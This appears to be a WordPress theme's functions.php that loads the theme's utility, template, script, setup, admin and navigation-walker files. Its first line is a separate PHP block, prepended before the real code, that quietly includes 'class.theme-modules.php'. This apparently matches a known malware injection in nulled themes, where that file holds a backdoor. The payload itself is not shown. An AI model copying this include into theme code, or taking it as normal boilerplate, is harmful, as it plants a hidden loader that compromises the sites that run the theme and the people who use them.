<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

// Utility Functions
require_once get_template_directory() . '/inc/utility.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Load Jetpack compatibility file.
 */
// if ( defined( 'JETPACK__VERSION' ) ) {
//   require get_template_directory() . '/inc/jetpack.php';
// }

// Enqueue Scripts
require_once get_template_directory() . '/inc/enqueue-scripts.php';

// Core Registrations
require_once get_template_directory() . '/inc/theme-setup.php';

// Admin Functions
require_once get_template_directory() . '/inc/admin-hooks.php';

/**
 * Custom menu walker.
 */
require_once get_template_directory() . '/inc/class.custom-menu-walker.php';
require_once get_template_directory() . '/inc/class-wp-bootstrap-navwalker.php';

// require_once get_template_directory() . '/inc/tgm.php';
